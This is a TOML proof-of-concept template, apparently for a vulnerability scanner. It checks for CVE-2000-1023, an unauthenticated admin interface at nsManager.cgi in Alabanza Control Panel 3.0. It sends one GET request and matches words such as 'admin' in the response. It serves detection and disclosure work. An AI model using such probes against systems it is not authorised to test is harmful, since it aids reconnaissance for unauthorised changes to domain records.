[info]
author = "AVE"
description = "Alabanza Control Panel 3.0 的 nsManager.cgi CGI 程序未要求密码验证即可执行管理命令，远程攻击者可通过直接访问该 CGI 接口修改域名信息。发送 GET 请求至 nsManager.cgi 路径，若返回管理界面内容则证明存在未授权访问漏洞。"
id = "POC-AVE-2000-0747"
name = "Alabanza Control Panel nsManager.cgi 未授权访问 PoC"
severity = "high"
tags = ["ave-2000-0747"]
vuln_id = [
    "CVE-2000-1023",
    "AVE-2000-0747",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/nsManager.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "nsManager",
    "domain",
    "admin",
]
